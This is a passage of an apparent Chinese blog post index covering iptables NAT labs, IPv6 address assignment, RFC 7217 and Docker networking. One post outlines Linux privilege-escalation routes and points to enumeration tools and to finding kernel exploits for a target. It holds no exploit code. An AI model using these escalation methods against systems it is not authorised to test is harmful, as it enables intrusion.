小实例 例1：给filter表INPUT链添加第一条规则，允许所有数据包访问本机 12345678910111213$ iptables -t filter -I INPUT -j ACCEPT $ iptables -t filter -nvL --line-numberChain INPUT (policy ACCEPT 0 packets, 0 bytes)num pkts bytes target prot opt in out source destination 1 13 800 ACCEPT all -- * * 0.0.0.0/0 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)num pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 10 packets, 1296 bytes)num pkts bytes target prot opt in out source destination 例2：给filter表追加一条规则，允许来自192.168.10.0/24网段的数据包访问本机 12345678910111213$ iptables -t filter -A INPUT -s 192.168.10.0/24 -j ACCEPT$ iptables -t filter -nvL --line-numberChain INPUT (policy ACCEPT 0 packets, 0 bytes)num pkts bytes target prot opt in out source destination 1 346 29802 ACCEPT all -- * * 0.0.0.0/0 0.0.0.0/0 2 0 0 ACCEPT all -- * * 192.168.10.0/24 0.0.0.0/0 Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)num pkts bytes target prot opt in out source destination Chain OUTPUT (policy ACCEPT 33 packets, 4247 bytes)num pkts bytes target prot opt in out source destination 例3：删除filter表中INPUT链中的第1条规则 123456789101112$ iptables -t filter -D INPUT 1$ iptables -t filter -L Chain INPUT (policy ACCEPT)target prot opt source destination ACCEPT all -- 192.168.10.0/24 anywhere Chain FORWARD (policy ACCEPT)target prot opt source destination Chain OUTPUT (policy ACCEPT)target prot opt source destination 例4：设置filter表中FORWARD链的默认规则 123456789101112$ iptables -t filter -P FORWARD DROP $ iptables -t filter -L Chain INPUT (policy ACCEPT)target prot opt source destination ACCEPT all -- 192.168.10.0/24 anywhere Chain FORWARD (policy DROP)target prot opt source destination Chain OUTPUT (policy ACCEPT)target prot opt source destination 例5：清空filter表中所有规则 1234567891011$ iptables -F $ iptables -t filter -L Chain INPUT (policy ACCEPT)target prot opt source destination Chain FORWARD (policy DROP)target prot opt source destination Chain OUTPUT (policy ACCEPT)target prot opt source destination 注意：-F清空链时，默认策略不受影响，默认策略也不参与链内规则的顺序编排 配置SNAT、DNAT 创建三个namespace 12345678# 本地主机$ ip netns add PC # 路由$ ip netns add PC_ROUTE# 远程服务主机$ ip netns add Inter_Server 创建2对veth 123$ ip link add PTR type veth peer name RTP$ ip link add RTS type veth peer name STR 将veth分别加入到创建的namespace中 123456789# PTR加入到本地PC$ ip link set PTR netns PC # RTP RTS加入到中间路由$ ip link set RTP netns PC_ROUTE$ ip link set RTS netns PC_ROUTE# STR加入到远程服务主机$ ip link set STR netns Inter_Server 设置IP地址并启动网卡 1234# 进入到PC的namespace bash中$ ip netns exec PC bash$ ip address add 192.168.0.2/24 dev PTR$ ip link set PTR up 同理设置其他的IP 1234# 进入到路由的namespace bash中$ ip netns exec PC_ROUTE bash$ ip address add 192.168.0.1/24 dev RTP$ ip address add 10.10.0.20/24 dev RTS 1234567# 进入到远程服务的namespace bash中$ ip netns exec Inter_Server bash$ ip address add 10.10.0.10/24 dev STR#远程服务添加第二块网卡S_eth0$ ip link add S_eth0 type dummy$ ip address add 2.2.2.2/32 dev S_eth0$ ip link set S_eth0 up 测试PC ping 路由，路由 ping 远程服务 添加PC、PC_ROUTE默认路由 1234# PC默认路由route add default gw 192.168.0.1 dev PTR# PC_ROUTE默认路由,不设置默认网关route add default dev RTS 此时PC与PC_ROUTE可以互通，PC_ROUTE与Inter_Server互通，PC与Inter_Server不通 添加SNAT规则 12345iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j SNAT --to 10.10.0.20# 适用于广域网为固定IP地址的情况，本例是这种情况# iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j MASQUERADE# 适用于广域网为动态分配IP地址的情况，典型例子是PPPoE 在nat表上的POSTROUTING链对源地址为192.168.0.0/24网段的地址做源地址转换，转换成10.10.0.20，这样Inter_Server就可以返回数据包给PC_ROUTE然后PC_ROUTE根据nat表的记录转发给PC主机。 但此时Inter_Server还不能主动ping通PC 添加DNAT规则将PC映射到PC_ROUTE 1iptables -t nat -A PREROUTING -d 10.10.0.20 -j DNAT --to 192.168.0.2 将发往10.10.0.20的数据包目的地址转换成192.168.0.2，然后再进行路由选择 此时Inter_Server ping 10.10.0.20，数据包会被转发至192.168.0.2 ip rule、ip route、iptables 例子：公司内网要求192.168.0.100 以内的使用 10.0.0.1 网关上网 （电信），其他IP使用 20.0.0.1 （网通）上网。 首先要在网关服务器上添加一个默认路由，当然这个指向是绝大多数的IP的出口网关 1ip route add default gw 20.0.0.1 之后通过 ip route 添加一个路由表： 12ip route add table 3 via 10.0.0.1 dev ethX # ethx 是 10.0.0.1 所在的网卡, 3 是路由表的编号 之后添加 ip rule 规则： 12ip rule add fwmark 3 table 3 # fwmark 3 是标记，table 3 是路由表3 上边。 意思就是凡事标记了 3 的数据使用 table3 路由表 之后使用 iptables 给相应的数据打上标记： 1iptables -A PREROUTING -t mangle -i eth0 -s 192.168.0.1 - 192.168.0.100 -j MARK --set-mark 3 因为 mangle 的处理是优先于 nat 和 fiter 表的，所以在数据包到达之后先打上标记，之后再通过 ip rule 规则，对应的数据包使用相应的路由表进行路由，最后读取路由表信息，将数据包送出网关。 深入理解iptables防火墙 wiki iptables iptables的四表五链与NAT工作原理 同网段和不同网段的ARP协议 Linux下ip route、ip rule、iptables的关系 路由选择时机 Linux中的虚拟网络接口"},{"title":"一些常用的小代码片段","date":"2022-04-18","updated":"2024-03-19","path":"2022/04/18/一些常用的小代码片段/","text":"16进制字符串转10进制IP地址 1234ipaddhex=&quot;3340a81f&quot;&#x27;.&#x27;.join([str(int(i,16)) for i in re.findall(r&#x27;.&#123;2&#125;&#x27;,ipaddhex)])# &#x27;51.64.168.31&#x27;"},{"title":"Linux提权总结","date":"2022-04-18","updated":"2024-03-19","path":"2022/04/18/Linux提权总结/","text":"原文地址 非漏洞提权方法 利用SUID二进制文件进行提权。 利用sudo进行提权。 NFS配置不当导致的提权。 使用PATH变量进行提权。 使用LD_PRELOAD进行提权。 利用Cron进行提权。 利用Docker进行提权。 利用Lxd进行提权。 利用capability进行提权。 rbash绕过总结。 Linux检测脚本 针对非漏洞的相关提权方法，以及搜集Linux上相关的敏感信息，这里可以参考一些脚本，例如： LinuEnum： https://github.com/rebootuser/LinEnum BeRoot： https://github.com/AlessandroZ/BeRoot Linux-smart-enumeration： https://github.com/diego-treitos/linux-smart-enumeration 漏洞提权方法 除去非漏洞提权，还有一种就是漏洞提权，一般情况下建议的是先查找非漏洞的提权方法，如果没有，则再根据内核版本来查找相关的提权漏洞。 获取内核版本后，可以搜索该版本存在哪些漏洞可以用来进行提权，例如常用的检测脚本： linux-exploit-suggester-2： https://github.com/jondonas/linux-exploit-suggester-2 linux-kernel-exploits： https://github.com/SecWiki/linux-kernel-exploits 但在一些最新提权漏洞上，更新可能并不是很快，例如CVE2020等提权漏洞。如果碰到目标机内核比较新，可能就需要自己去手动搜索相关问题，谷歌相关的关键字，或者找一些在线网站搜索，例如： https://cxsecurity.com/ 它首页的底部有相关产品或者系统的CVE汇总，其中有linux kernel，可以查看最新的关于linux内核CVE问题，但是只提供相关编号和介绍，最新的可能没有exp，这时可以拿CVE编号再去github搜索，只要不是很新，一般会有exp提供。 总结 思维导图"},{"title":"IPv6地址生成过程","date":"2022-01-08","updated":"2024-03-19","path":"2022/01/08/IPv6地址生成过程/","text":"IPv6地址格式 开头的64比特用来代表网络，后面的64比特用作接口标识： 接口标识可以有多种方式产生： 静态手工设置 链路层地址 (MAC) 转化为64比特 EUI-64 由 DHCPv6 指定 由隐私扩展或加密协议生成 为了便于书写，IPv6 推荐末端加上网络前缀长度的压缩格式标记，据此上面的地址可以缩短表示为： 2001:db8:130f::7000:0:140b/64 IPv6地址分类 地址类型 英文名称 二进制 16进制 应用 链路本地地址（单播） Link-local address 1111 1110 10 fe80::/10 单链路通信 唯一本地地址（单播） Unique local address 1111 1101 fd00::/8 本地网络通信 全局单播地址 Global unicast address 001 2000::/3 互联网通信 组播地址 Multicast address 1111 1111 ff00::/8 群组通信，流媒体视频 IPv6地址可以分为三种类型：单播地址、多播地址、任播地址。 单播： 单播地址可以分为6种： Global Unicast Link-Local Unicast Loopback Unspecified Unique Local Embedded IPv4 组播： 因为 IPv6 组播地址只能用作目的地址，所以其比特位定义与单播不同。参见 RFC 4291，组播地址包含4比特特征标志位、4比特应用范围标志及最后112比特群组标识： 另外同一协议还规定了一些预留的 IPv6 组播地址，其中最重要的有： 本地网段所有节点 — ff02::1 本地网段所有路由器 — ff02::2 本地请求节点地址: ff02::1:ffxx:xxxx 组播侦听发现协议（MLD） 组播侦听发现协议原理是当源主机发送一份数据到一个组播地址，所有加入了这个组播地址的成员都可以收到一份数据的拷贝。并且只有组播成员才可以接收到数据。路由器通过MLD协议，可以了解自己的直连网段上是否有IPv6组播组的侦听者，并在数据库里做相应记录。同时，路由器还维护与这些IPv6组播地址相关的定时器信息。 MLD是ICMPV6的一个子协议。现在有二种版本，MLDV1和MLDV2。MLDV1有三类消息类型：查询消息，报告消息和DONE消息。MLDv2有二类消息类型：查询消息和报告消息。不过它是支持MLDv1的DONE消息的。 1. 普遍组查询报文（General Query） 用于发现在直连的链路上哪些组播地址有组播征听者。 2. 特定组播地址查询消息（Multicast AddresSpecific Query） 用于判断一个特定的组播地址在本地链路上是否有组播听者。在MLDv2中还有一征类消息即特定源组播查询消息(Multicast Addresand Source Specific Query)，用于判断一个特定源的组播地址在本地链路上是否有组播征听者。 3. 成员报告报文（Multicast Listener Report）(Type=131) 123456789源地址:1、link-local address which the query is being sent2、If the MLDv2 Multicast Listener Report message is for a solicitednodemulticast address corresponding to a unicast address for which duplicate addressdetection is not yet complete，the source address is set to the unspecified address(::)目的地址：FF02::16 未进行DAD检测的暂时无本地链路地址的，MLD源地址为::； DAD检测完获取到本地链路地址的，MLD源地址为LINK-LOCAL地址； 4. 成员离开报文（Multicast Listener Done）(Type=132) 主机离开组播组时主动向查询器发送的报文，用于宣告自己离开了某个组播组。 The Source Address: link-local address which the query is being sent The Destination Address： FF02::2 NDP 协议 IPv6 动态地址分配依赖于邻居发现协议 (Neighbor Discovery Protocol，简称NDP)。NDP作用于数据链路层，负责在链路上发现其他节点和相应的 IPv6 地址，并确定可用路由和维护其他活动节点的信息可达性。它为 IPv6 网络提供了等效于 IPv4 网络中地址解析协议 (ARP) 与 ICMP 路由器发现和重定向协议的功能。然而，NDP加入了许多改进以及新的功能。 NDP 定义了五种 ICMPv6 消息类型： 123451. 路由器请求 (Router Solicitation，简称 RS)2. 路由器通告 (Router Advertisement，简称 RA)3. 邻居请求 (Neighbor Solicitation)4. 邻居通告 (Neighbor Advertisement)5. 重定向 (Redirect) 这里的头二个消息类型 RS 和 RA，就是实现 IPv6 动态地址分配的关键。主机会发送 RS 消息到本地网段所有路由器组播地址 ff02::2，请求路由信息。当路由器收到网络节点发出的 RS 时，会即时发送 RA 回应。 RA关键标志位 Autonomous flag(简称A标记)：表示是否配置无状态IP (stateless)。在一个RA报文中，可存在多个prefix，比如2020::/64、2021::/64、2023::/64，每个prefix都可以独立配置A 标记 为1时：表示客户端应当在该prefix范围内自动生成IPv6地址(客户端通过DAD自行保证地址可用)，并配置子网路由条目、网关 为0时：表示客户端不应当在该prefix范围内自动生成IPv6地址，但是可以配置子网路由条目、网关 Other flag(简称O 标记)：表示是否通过DHCPv6获得除IP以外的其他参数(如DNS列表)。O 标记也是RA报文中的全局参数，一个RA报文只有一个O 标记。注意：仅当M 标记为off时，该参数才会被读取。 为1时：当M 标记为1，或者M flag为0且至少有一个A 标记为1时，将通过DHCPv6获得其他参数 为0时：当M 标记为1时，依然将通过DHCPv6获得其他参数；当M 标记也为0时，将不通过DHCPv6获得其他参数 Managed flag(简称M标记)：表示是否配置有状态IP。M flag是RA报文的全局参数，一个RA报文只有一个M 标记 为1时：表示在stateless流程结束后开始stateful流程，也就是告诉客户端可以通过DHCPv6来获得IPv6地址和其他参数(如DNS列表等) 为0时：表示不通过DHCPv6来获得IPv6地址。 L — “在链路” (on-link) 标志，设为1时指示前缀可用于“在链路”判定 类似于 IPv4 的子网掩码功能，“在链路”判定的意义在于让主机确定某个接口可以接入哪些网络。缺省情况下，主机只将链路本地地址所在的网络视为“在链路”。如果无法判定一个目的地址的“在链路”状态，主机默认将 IPv6 数据报转发给默认网关（或缺省路由器）。当主机收到 RA 消息时，如果一个前缀信息选项的“在链路”标志设为1，并且有效使用期限 (Valid Lifetime) 也是非0值，那么主机就会在前缀列表中为之创建一个新的前缀网络条目。所有未过期的前缀网络条目都是“在链路”的。 消息时序 了解了 NDP 协议及 RA 消息所传递的信息之后，来看看它们是如何引导网络节点实现动态地址分配的。 网络中的路由器会周期性的发送 RA 消息到本地网段所有节点组播地址 (ff02::1)。但是，为了避免时延，主机启动完成后会马上发送一个或多个 RS 消息到本地网段所有路由器。协议规定路由器要在0.5秒内回应 RA 消息。之后，根据所收到的 RA 消息中的 M/O/A 比特位的取值，主机会决定如何动态配置接口的唯一本地地址和全局单播地址，以及如何获取其他配置信息。在某些比特位取值组合下，主机需要运行 DHCPv6 客户端软件，连接到服务器以获取地址分配和/或其他配置信息。整个过程如以下消息时序图所示： 12345678910111213141516171819202122sequenceDiagramparticipant R as 路由器participant H as 主机participant S as DHCPv6 服务器Note over R,H: 路由器请求rect rgb(239, 252, 202)H-&gt;&gt;R: Router SoliticationR--&gt;&gt;H: Router AdvertisementendNote over H,S: 地址请求rect rgb(230, 250, 255)H-&gt;&gt;S: DHCPv6 SolicitS--&gt;&gt;H: DHCPv6 AdvertiseH-&gt;&gt;S: DHCPv6 RequestS--&gt;&gt;H: DHCPv6 ReplyendNote over H,S: 其他信息请求rect rgb(230, 250, 255)H-&gt;&gt;S: DHCPv6 Information-requestS--&gt;&gt;H: DHCPv6 Replyend 注意： 与 IPv4 DHCP 协议不同，DHCPv6 客户端使用 UDP 端口546，服务器使用 UDP 端口547。 以下详细解释由 M/O/A 比特位的取值组合所确定的三种动态分配方案： SLAAC SLAAC + 无状态 DHCPv6 有状态 DHCPv6 1. SLAAC SLAAC是最简单的 IPv6 地址自动分配方案，不需要任何服务器。其工作原理是主机启动后发送 RS 消息请求，路由器回送 RA 消息至本地网段所有节点。如果 RA 消息包含如下设置： 首部的 M 比特和 O 比特都清零 前缀信息选项的 L 比特和 A 比特置为1 那么主机收到这个 RA 消息后，执行如下操作实现 SLAAC： 组合网络前缀与本地接口标识，生成唯一本地地址或全局单播地址 安装默认网关（或缺省路由）指向路由器地址 (RA消息的源地址) 将此接口设为对应网络前缀的“在链路”，也是以上默认网关的下一跳接口 如果包含 RDNSS 和/或 DNSSL 选项，安装域名服务器和域名后缀 这样，主机就获得了一个或多个 IPv6 唯一本地地址或全局单播地址，以及默认网关和域名服务信息，可以完成各种互联网连接。 下面是思科 Catalyst 9300 多层接入交换机上的 SLAAC 配置示例： 1234567ipv6 unicast-routinginterface Vlan10 ipv6 enable ipv6 address 2001:ABCD:1000::1/64 ipv6 nd ra dns server 2001:4860:4860::8888 infinite ipv6 nd ra dns search-list example.com 思科多层交换机的第三层接口提供路由功能。可以看到，当在 VLAN 10 的第三层接口激活 IPv6 之后，其默认的地址自动分配方案就是 SLAAC。从该接口发出的 RA 消息的控制比特位全部按照 SLAAC 方案设置，其配置的每个 IPv6 地址的网络前缀都会被自动加入到 RA 前缀信息选项列表中。当然，网络管理员也可以用单独的接口配置命令排除某些网络前缀。示例的最后两行配置命令指定了 RDNSS 和 DNSSL，它们也被加入到 RA 消息选项中。 这时如果主机接入 VLAN 10 的端口，就会马上获得一个网络前缀为 2001:ABCD:1000::/64 全局单播地址，同时其默认网关的地址被设定为 2001:ABCD:1000::1。打开浏览器输入一个网址，它就会向指定的域名服务器 2001:4860:4860::8888（谷歌的公共域名服务器地址）发出域名解析请求，以获取目的网址的 IPv6 地址建立连接。 2. SLAAC + 无状态 DHCPv6 SLAAC 自动地址分配快捷方便，为中小型网络部署提供了即插即用的 IPv6 部署方案。但是如果网络节点需要获得其他一些配置信息，比如 NTP/SNTP 服务器、TFTP 服务器和 SIP 服务器地址，或者其功能依赖某些厂商特定的信息选项 (Vendor-specific Information Option) 时，就必须选择 SLAAC + 无状态 DHCPv6 的方案。 这一方案依然使用 SLAAC 自动地址分配，但是路由器会指示主机去连接 DHCPv6 服务器以获取其他配置信息。这时路由器回送的 RA 消息设置变为： 首部的 M 比特清零，O 比特置为1 前缀信息选项的 L 比特和 A 比特置为1 主机收到这个 RA 消息后，执行如下操作： 组合网络前缀与本地接口标识，生成唯一本地地址或全局单播地址 安装默认网关（或缺省路由）指向路由器地址 (RA消息的源地址) 将此接口设为对应网络前缀的“在链路”，也是以上默认网关的下一跳接口 如果包含 RDNSS 和/或 DNSSL 选项，安装域名服务器和域名后缀 启动 DHCPv6 客户端，连接 DHCPv6 服务器请求其他配置信息 保存 DHCPv6 服务器回复的其他配置信息 可以看到，SLAAC + 无状态 DHCPv6 在地址分配上与 SLAAC 并没有什么不同。DHCPv6 只是提供附加配置信息，不会分配 IPv6 地址。所以 DHCPv6 服务器不会追踪网络节点的地址分配状况，这就是“无状态”的含义。 相应的 Catalyst 9300 交换机上的配置命令如下： 123456789101112ipv6 unicast-routingipv6 dhcp pool vlan-10-clients dns-server 2001:4860:4860::8888 domain-name example.com sntp address 2001:DB8:2000:2000::33interface Vlan10 ipv6 enable ipv6 address 2001:ABCD:1000::1/64 ipv6 nd other-config-flag ipv6 dhcp server vlan-10-clients # ipv6 dhcp relay destination 2001:9:6:40::1 与 SLAAC 的例子不同点在于，VLAN 10 接口配置命令ipv6 nd other-config-flag明确指定置位 RA 消息的 O 比特。其下一条命令ipv6 dhcp server vlan-10-clients激活接口的 DHCPv6 服务器响应功能，对应服务器的共用资源名称为vlan-10-clients。DHCPv6 服务器的配置在接口配置的上方，从ipv6 dhcp pool vlan-10-clients处开始，包含了 DNS 服务器地址、DNS 域名和 SNTP 服务器地址。 如果使用交换机之外的位于其他网段的 DHCPv6 服务器，可以删除ipv6 dhcp server命令，启用示例中下一行的ipv6 dhcp relay destination命令指定转发 DHCPv6 请求至外部服务器的地址。 3. 有状态 DHCPv6 许多大型企业应用 DHCP 管理设备的 IPv4 地址，所以部署 DHCPv6 集中分配和管理 IPv6 地址是自然的优先选择。这就是有状态 DHCPv6的用武之地。这一方案同样需要路由器发送的 RA 消息，但是不会仅仅依靠网络前缀进行自动地址分配。RA 消息的控制比特位设置是： 首部的 M 比特置为1，O 比特无所谓 前缀信息选项的 L/A 比特可按需要设为1或0 收到这个 RA 消息后，主机执行操作如下： 如果有前缀信息选项 A 比特设为1，则组合生成唯一本地地址或全局单播地址 安装默认网关（或缺省路由）指向路由器地址 (RA消息的源地址) 如果有前缀信息选项 L 比特设为1，将此接口设为对应网络前缀的“在链路” 如果包含 RDNSS 和/或 DNSSL 选项，安装域名服务器和域名后缀 启动 DHCPv6 客户端，连接服务器请求地址和其他配置信息 将 DHCPv6 服务器分配的地址设置到此接口 保存 DHCPv6 服务器回复的其他配置信息 Catalyst 9300 交换机上的有状态 DHCPv6 配置命令示例如下： 123456789101112ipv6 unicast-routingipv6 dhcp pool vlan-10-clients address prefix FD09:9:5:90::/64 address prefix 2001:9:5:90::/64 dns-server 2001:9:5:90::115 domain-name test.cominterface Vlan10 ipv6 enable ipv6 address 2001:ABCD:1:1::1/64 ipv6 nd prefix 2001:ABCD:1:1::/64 no-advertise ipv6 nd managed-config-flag ipv6 dhcp server vlan-10-clients 与 SLAAC + 无状态 DHCPv6 相比，这里接口配置去掉了ipv6 nd other-config-flag，改用ipv6 nd managed-config-flag命令。这对应于将 RA 消息首部的 M 比特置为1。DHCPv6 服务器的配置加入了两条address prefix命令设置网络前缀。同时接口配置的ipv6 nd prefix 2001:ABCD:1:1::/64 no-advertise指定路由器不包含2001:ABCD:1:1::/64前缀信息选项到 RA 中。所以，这个例子主机接口不会生成 SLAAC 地址，只会产生来自 DHPCv6 的两个地址：一个是网络前缀为 FD09:9:5:90::/64 的唯一本地地址，另一个是网络前缀为 2001:9:5:90::/64 的全局单播地址。这两个地址的接口标识也分别由 DHPCv6 指定。 如何分辨主机接口动态分配的地址来源？方法很简单。要记住的一点是，DHPCv6 不会发送网络前缀长度给请求者，所以从 DHPCv6 拿到的地址的网络前缀长度都是128。而 SLAAC 生成的地址网络前缀长度不会是128的。 下面为Linux 主机上接口实例： 12345678910wlp0s20f3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.4.240 netmask 255.255.255.0 broadcast 192.168.4.255 inet6 fe80::b2e1:5565:d56e:5d0f prefixlen 64 scopeid 0x20&lt;link&gt; inet6 fd4b:e40e:f5de::e73 prefixlen 128 scopeid 0x0&lt;global&gt; inet6 fd4b:e40e:f5de:0:b482:79d1:43c8:fe3f prefixlen 64 scopeid 0x0&lt;global&gt; ether dc:71:96:7f:a6:3e txqueuelen 1000 (Ethernet) RX packets 942610 bytes 1202958613 (1.1 GiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 416037 bytes 57598961 (54.9 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 我们马上可以判定，该接口使用的是有状态 DHCPv6 地址分配，但也用收到的RA通告报文中相同的网络前缀fd4b:e40e:f5de::/64生成了 SLAAC 地址： fd4b:e40e:f5de::e73/128 — DHCPv6 地址，接口标识为随机数 fd4b:e40e:f5de:0:b482:79d1:43c8:fe3f/64— SLAAC 地址，接口标识为 由隐私扩展或加密协议生成 fe80::b2e1:5565:d56e:5d0f/64 — 链路本地地址，接口标识为 由隐私扩展或加密协议生成 下表列出了 RA 消息的控制比特组合与地址分配和其他配置获取方式的关系： M-比特 O-比特 A-比特 主机地址 其他配置 0 0 0 静态设置 手工配置 0 0 1 前缀由 RA 指定，自动生成 手工配置 0 1 0 静态设置 DHCPv6 0 1 1 前缀由 RA 指定，自动生成 DHCPv6 1 0 0 有状态 DHCPv6 DHCPv6 1 0 1 有状态 DHCPv6 和/或 自动生成 DHCPv6 1 1 0 有状态 DHCPv6 DHCPv6 1 1 1 有状态 DHCPv6 和/或 自动生成 DHCPv6 总结三种动态分配方案: 分配方案 特点 适用场景 SLAAC 简单实用，快速部署 中小企业、消费类产品联网、物联网 (IoT) SLAAC + 无状态 DHCPv6 自动配置，扩展服务 中小企业需要附加网络服务 有状态 DHCPv6 集中管理和控制 大型企业、事业单位和校园网 **注意：**由于 IPv6 网络接口可以有多个地址（一个链路本地地址，加上一个或多个唯一本地地址和/或全局单播地址），在建立外部连接时，如何选择源地址变得非常重要。RFC 6724 给出了详细的 IPv6 源地址选择规则。在嵌入式系统的开发中，与同一远端设备连接的控制平面和数据平面常常由不同的功能组件实现。比如控制平面直接调用 Linux 用户空间套接字建立连接，连接使用的 IPv6 源地址由 TCP/IP 协议栈选定，而数据平面直接在内核空间实现数据封装处理和传输。这时要及时将控制平面所选择的 IPv6 源地址同步到数据平面，否则用户数据无法送达同一目的地。 https://www.packetmania.net/2020/12/01/IPv6-Addressing/ https://blog.csdn.net/linuxblack125125/article/details/7884415 https://blog.csdn.net/qq_38265137/article/details/80475510 https://blog.csdn.net/weixin_35123329/article/details/112780543"},{"title":"IPv6地址生成","date":"2021-04-18","updated":"2024-03-19","path":"2021/04/18/IPv6地址生成/","text":"发现很多人的信息还停留在 1998 年的 RFC 2464 定义的 EUI64，由于其潜在安全风险，2014 年的 RFC 7217 定义了生成用于 SLAAC 的接口 ID 的算法。目前就我所了解的主流操作系统，iOS 12 已经支持这个标准，Android 7 尚不支持、同时也不支持 DHCPv6，Windows 10 1803 虽然没有遵守 RFC 7217，但也没有使用 EUI64，并且还支持随机 MAC 地址。 每个节点都会自动生成一个本地链接地址，但是： 该地址可能不是以RFC 2464中指定的EUI-64格式生成的。IPv6地址也可以是加密生成的地址（RFC 3972），临时隐私地址（RFC 4941），或者在现代操作系统中，可以是稳定的隐私地址（RFC 7217）。 由于管理员的明确配置，看起来像具有EUI-64接口ID的地址实际上可能与指示的MAC地址不对应。 由于不能只是将地址“转换回”为MAC地址，因此必须发送邻居请求来确定MAC地址。 还有其他一些原因也使得必须进行邻居征集。其中一些是： 重复地址检测（RFC 4862）。其他主机可能（正确或错误）声称了该主机要使用的地址。 邻居不可达检测。缺乏对邻居请求的响应是邻居无法到达的一个指标。 RFC 7217 IPv6 更新指定了算法来生成 IPv6 接口标识符（以及 IPv6 地址），在相同网络内稳定，但随着节点从一个网络移动到另一个网络而发生变化。该算法可用以下表达式来总结和体现： IPv6_IID = Hash(Net_Prefix, Net_ID, Net_Iface_ID, Secret_Key) 其中： Hash()：加密安全哈希函数 Net_Prefix：本地路由器发布的 IPv6 前缀 Net_ID：可选网络标识符，例如 WiFi 网络的服务集标识符 Net_Iface_ID：底层网络接口的标识符（例如网络接口名称） Secret_Key：秘密值，通常在系统安装期间作为随机值初始化，并在重新启动时保持不变 基本上来说，IPv6 接口标识符是通过对多个参数连接计算安全散列来获得，最常见的是本地路由器（ Net_Prefix ）和秘密密钥（ Secret_Key ）公布的网络前缀。 只要节点保持在相同网络，它将维护和配置相同的 IPv6 地址，这是因为散列函数的所有参数保持不变。另一方面，由于网络前缀会改变，所以一旦节点连接到不同的网络，IPv6 接口标识符将会改变。同时，如果节点返回到之前连接的网络，它将配置与之前相同的 IPv6 地址，因为用于计算该 IPv6 接口标识符的所有参数都将与原来情况相同。 https://searchsecurity.techtarget.com.cn/11-24286/"},{"title":"Docker网络模式","date":"2021-02-01","updated":"2024-03-19","path":"2021/02/01/Docker网络模式/","text":"https://www.cnblogs.com/zuxing/articles/8780661.html Docker自身的4种网络工作方式，和一些自定义网络模式 安装Docker时，它会自动创建三个网络，bridge（创建容器默认连接到此网络）、 none 、host host：容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。 Container：创建的容器不会创建自己的网卡，配置自己的IP，而是和一个指定的容器共享IP、端口范围。 None：该模式关闭了容器的网络功能。 Bridge：此模式会为每一个容器分配、设置IP等，并将容器连接到一个docker0虚拟网桥，通过docker0网桥以及Iptables nat表配置与宿主机通信。 以上都是不用动手的，真正需要配置的是自定义网络。 默认网络 当你安装Docker时，它会自动创建三个网络。你可以使用以下docker network ls命令列出这些网络： 12345$ docker network lsNETWORK ID NAME DRIVER7fca4eb8c647 bridge bridge9f904ee27bf5 none nullcf03ee007fb4 host host Docker内置这三个网络，运行容器时，你可以使用该–network标志来指定容器应连接到哪些网络。 该bridge网络代表docker0所有Docker安装中存在的网络。除非你使用该docker run --network=选项指定，否则Docker守护程序默认将容器连接到此网络。 我们在使用docker run创建Docker容器时，可以用 --net 选项指定容器的网络模式，Docker可以有以下4种网络模式： host模式：使用 --net=host 指定。 none模式：使用 --net=none 指定。 bridge模式：使用 --net=bridge 指定，默认设置。 container模式：使用 --net=container:NAME_or_ID 指定。 下面分别介绍一下Docker的各个网络模式。 2.1 Host 相当于Vmware中的桥接模式，与宿主机在同一个网络中，但没有独立IP地址。众所周知，Docker使用了Linux的Namespaces技术来进行资源隔离，如PID Namespace隔离进程，Mount Namespace隔离文件系统，Network Namespace隔离网络等。一个Network Namespace提供了一份独立的网络环境，包括网卡、路由、Iptable规则等都与其他的Network Namespace隔离。一个Docker容器一般会分配一个独立的Network Namespace。但如果启动容器的时候使用host模式，那么这个容器将不会获得一个独立的Network Namespace，而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。 例如，我们在10.10.0.186/24的机器上用host模式启动一个含有nginx应用的Docker容器，监听tcp80端口。 12345678# 运行容器;$ docker run --name=nginx_host --net=host -p 80:80 -d nginx74c911272942841875f4faf2aca02e3814035c900840d11e3f141fbaa884ae5c # 查看容器;$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES74c911272942 nginx &quot;nginx -g &#x27;daemon ...&quot; 25 seconds ago Up 25 seconds nginx_host 当我们在容器中执行任何类似ifconfig命令查看网络环境时，看到的都是宿主机上的信息。而外界访问容器中的应用，则直接使用10.10.0.186:80即可，不用任何NAT转换，就如直接跑在宿主机中一样。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。 12$ netstat -nplt | grep nginxtcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 27340/nginx: master 2.2 Container 在理解了host模式后，这个模式也就好理解了。这个模式指定新创建的容器和已经存在的一个容器共享一个Network Namespace，而不是和宿主机共享。新创建的容器不会创建自己的网卡，配置自己的IP，而是和一个指定的容器共享IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过lo网卡设备通信。 2.3 None 该模式将容器放置在它自己的网络栈中，但是并不进行任何配置。实际上，该模式关闭了容器的网络功能，在以下两种情况下是有用的：容器并不需要网络（例如只需要写磁盘卷的批处理任务）。 overlay 在docker1.7代码进行了重构，单独把网络部分独立出来编写，所以在docker1.8新加入的一个overlay网络模式。Docker对于网络访问的控制也是在逐渐完善的。 2.4 Bridge 相当于Vmware中的Nat模式，容器使用独立network Namespace，并连接到docker0虚拟网卡（默认模式）。通过docker0网桥以及Iptables nat表配置与宿主机通信；bridge模式是Docker默认的网络设置，此模式会为每一个容器分配Network Namespace、设置IP等，并将一个主机上的Docker容器连接到一个虚拟网桥上。下面着重介绍一下此模式。 3.1 Bridge模式的拓扑 当Docker 